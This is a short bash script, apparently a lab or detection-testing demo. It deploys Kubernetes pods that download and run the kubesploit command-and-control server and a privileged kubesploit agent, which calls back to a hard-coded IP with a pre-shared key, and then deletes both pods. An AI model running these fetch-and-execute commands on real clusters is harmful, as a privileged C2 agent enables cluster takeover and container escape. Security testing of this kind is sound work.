#!/bin/bash
export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/opt/X11/bin:/Library/Apple/usr/bin"
export GOENV_ROOT="$HOME/.goenv"
export PATH="$GOENV_ROOT/bin:$PATH"
eval "$(goenv init -)"

goenv local 1.19.13
kubectl create namespace demo

kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: kubesploit-server
  namespace: demo
spec:
  containers:
  - name: kubesploit-server
    image: entlein/lightening:0.0.2
    command: [ "sh", "-c", "apt update && apt install p7zip-full wget -y &&wget  https://github.com/cyberark/kubesploit/releases/download/v0.1.3/kubesploitServer-Linux-x64.7z && 7z x kubesploitServer-Linux-x64.7z -pkubesploit   && chmod +x kubesploitServer-Linux-x64 && ./kubesploitServer-Linux-x64 & sleep infinity"]
EOF

# Get the IP of the pod
HOST_IP=$(kubectl get pod kubesploit-server -n demo -o jsonpath='{.status.podIP}')
echo "kubesploit-server IP: $HOST_IP"


kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: kubesploit-agent
  namespace: demo
spec:
  containers:
  - name: kubesploit-agent
    image: ubuntu
    command: [ "sh", "-c", "apt update && apt install p7zip-full wget -y && wget https://github.com/cyberark/kubesploit/releases/download/v0.1.3/kubesploitAgent-Linux-x64.7z && 7z x kubesploitAgent-Linux-x64.7z -pkubesploit && chmod +x kubesploitAgent-Linux-x64 && ./kubesploitAgent-Linux-x64 -url https://10.1.2.170:443 -psk kubesploit & sleep infinity"]
    securityContext:
      privileged: true
EOF

kubectl delete -n demo pod  kubesploit-server
kubectl delete -n demo pod  kubesploit-agent